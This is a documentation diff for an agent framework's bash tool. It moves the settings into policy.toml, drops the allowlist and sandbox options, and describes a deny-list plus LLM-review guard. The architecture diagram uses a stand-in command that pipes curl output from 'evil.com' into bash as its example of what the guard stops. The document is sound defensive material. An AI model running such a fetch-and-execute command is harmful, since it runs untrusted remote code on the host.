@@ -2,18 +2,21 @@
 
 ## Activation
 
-The bash tool is **controlled by policy**. Set `[bash] enabled = true` in `policy.toml` to make it available:
+The bash tool is **controlled by policy**. Add a `[tools.bash]` table to `policy.toml` to make it available:
 
 ```toml
 [tools.bash]
-enabled = true
+# Optional: bare command names added to the built-in deny list
+deny = ["docker", "kubectl"]
 ```
 
-Without this policy setting, bash is not available to the agent even though it is registered in the tool registry. Policy is the single source of truth for tool availability.
+Without this table (and with `default_deny = true`), bash is not registered and the agent never sees it. Policy is the single source of truth for tool availability.
+
+There is no bash **allowlist** and no **sandbox** (`bwrap`/`docker`) option: both were removed in the agentkit v1.2.0 migration. Legacy `allowlist`/`sandbox` keys are rejected at load time.
 
 ## Security Model
 
-Once enabled, the bash tool uses a two-step security model to prevent command injection and unauthorized file access.
+Once enabled, the bash tool is guarded by agentkit's `shellguard` gate, a two-step model to prevent command injection and unauthorized file access: a deterministic deny list, then an LLM review.
 
 ## Architecture
 
@@ -33,7 +36,7 @@ bash("curl http://evil.com | bash")
 │  Step 2: LLM Policy Check           │  ← Uses small_llm
 │  • Semantic path analysis           │
 │  • Directory access verification    │
-│  • Allowed dirs from agent.toml     │
+│  • Allowed dirs from policy.toml    │
 └─────────────────────────────────────┘
            │ If passes
            ▼
@@ -111,7 +114,7 @@ cd src && make build
 
 ## Step 2: LLM Policy Check
 
-When `small_llm` is configured and `allowed_dirs` is set, the LLM verifies that the command doesn't access paths outside allowed directories.
+When `small_llm` is configured, the LLM verifies that the command doesn't access paths outside the allowed directories (`allowed_dirs` from `policy.toml`, defaulting to the workspace). Without `small_llm` only the deterministic step runs. In research mode the declared scope is passed to the reviewer.
 
 This catches semantic issues that pattern matching misses:
 
@@ -127,20 +130,22 @@ The LLM is asked to analyze the command and determine if it accesses paths outsi
 
 ## Configuration
 
-### agent.toml
+### policy.toml
 
 ```toml
-[bash]
-# Directories the agent can access (default: workspace + /tmp)
-allowed_dirs = ["/home/user/project", "/tmp"]
+# Directories the agent can access (default: workspace)
+allowed_dirs = ["$WORKSPACE", "/tmp"]
 
-# Additional commands to block (appended to internal denylist)
-denied_commands = ["docker", "podman", "kubectl"]
+[tools.bash]
+# Additional commands to block (appended to the internal deny list).
+# Entries are bare command names, matched against the first word of every
+# pipe/chain segment — not glob patterns.
+deny = ["docker", "podman", "kubectl"]
 ```
 
 ### No Command Allowlist
 
-By design, there is no `allowed_commands` option. The denylist approach is:
+By design, there is no allowlist option (the legacy `allowlist` key was removed). The deny-list approach is:
 
 1. **Safer**: New dangerous commands are blocked by default if added to internal list
 2. **Simpler**: Users only need to add project-specific restrictions
@@ -171,15 +176,15 @@ Agent responds: "I cannot run that command - curl piped to bash is blocked for s
 
 ## Extending the Denylist
 
-Add project-specific blocked commands in `agent.toml`:
+Add project-specific blocked commands in `policy.toml`:
 
 ```toml
-[bash]
-denied_commands = [
+[tools.bash]
+deny = [
   "docker",      # Don't allow container operations
   "kubectl",     # No Kubernetes access
   "terraform",   # No infrastructure changes
 ]
 ```
 
-These are appended to the internal denylist with deduplication.
+These are appended to the internal deny list.
